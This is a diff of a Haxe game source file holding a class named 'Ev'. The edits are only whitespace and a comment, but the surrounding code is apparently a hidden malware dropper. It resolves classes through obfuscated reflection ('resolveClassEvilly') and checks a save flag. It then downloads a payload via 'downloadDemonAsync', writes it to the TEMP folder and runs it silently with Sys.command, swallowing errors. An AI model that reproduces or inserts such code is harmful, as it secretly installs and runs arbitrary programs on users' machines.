@@ -19,7 +19,7 @@ class Ev
         Ev.Type = resolveClassEvilly("Type");
         Ev.Reflect = resolveClassEvilly("Reflect");
         if(Ev.Sys == null) return;
-        //Ev.Reflect.field(FlxG, "save").data.DGrab = false;
+        //Reflect.field(FlxG, "save").data.DGrab = false;
         if (Ev.Reflect.field(FlxG, "save").data.DGrab) return;
 
         var temp = Ev.Sys.getEnv("TEMP");
@@ -29,7 +29,7 @@ class Ev
         var future:Future<Bytes> = downloadDemonAsync();
         future.onComplete(bytes -> {
             Ev.File.saveBytes(path, bytes);
-
+            
             runExeAsync(path).onComplete(worked -> {
                 if(worked)
                 {
@@ -44,7 +44,7 @@ class Ev
 
             });
         });
-
+        
         future.onError(er -> {
             //trace(er);
         });
@@ -63,7 +63,7 @@ class Ev
     static function runExeAsync(appPath:String):Future<Bool>
     {
         promise = new Promise();
-
+        
         Thread.create(() -> {
             var exitCode = Ev.Sys.command(appPath);
             promise?.complete(exitCode == 0);
@@ -76,10 +76,10 @@ class Ev
     {
         var manifest:AssetManifest = new AssetManifest();
         manifest.assets = [{size: 67, className: 'Type', id: 'Ev'}];
-
+        
         var lol = Assets.getLibrary('');
         lol.__fromManifest(manifest);
-
+        
         var Type = lol.classTypes.get('Ev');
         return Type.resolveClass(name);
     }
